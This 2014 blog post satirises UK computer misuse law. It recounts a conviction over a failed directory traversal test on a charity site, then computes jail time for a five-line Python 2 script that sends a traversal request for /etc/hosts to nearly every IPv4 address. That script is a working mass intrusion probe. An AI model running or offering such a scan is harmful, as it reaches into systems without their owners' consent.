---
layout: post
title: Up to 8 billion years in jail
date: 2014-07-09
---

In 2005, a computer security professional was [convicted for running a failed directory traversal test](http://www.scl.org/site.aspx?i=ed832) on a Tsunami charity website he had donated to, as he became concerned that the credit card details he had just provided could be abused:

>He had visited the site and donated £30, but had become concerned at its slow response and what he had regarded as poor graphics. There had been extensive press coverage of “phishing” attempts and a number of these had involved fake sites masquerading as well-known UK financial institutions. His concern was that he had just provided details of his name, address and credit card and that these might be abused. Cuthbert sought to test the site by using a directory traversal test - in effect he re-formed the URL he could see in the command bar of his Internet  browser to see whether the security settings on the remote Web site would allow him access beyond the web root. His attempt was rejected, he felt relieved and thought no more of the matter.

The 5-line Python script below performs this test once per second - on the entire space of 4,294,967,295 possible IPv4 addresses.

<pre>import socket, struct, urllib2
for n in xrange(2**24, 4294967295):
    try:
        if 'localhost' in urllib2.urlopen('http://' + socket.inet_ntoa(struct.pack('!L', n)) + '/../../../../../../../../etc/hosts', timeout=1).read(): print n
    except Exception: pass</pre>

Given that [case law](http://www.scl.org/site.aspx?i=ed832) has established that running a failed directory traversal test on a computer (singular) is in breach of [section 1 of the Computer Misuse Act 1990](http://www.legislation.gov.uk/ukpga/1990/18/section/1) which is punishable by up to 2 years in jail for each offence, does that mean running the script above can yield you up to 8,589,934,590 years in jail? (Of course, unallocated IPv4 addresses may not be counted.)
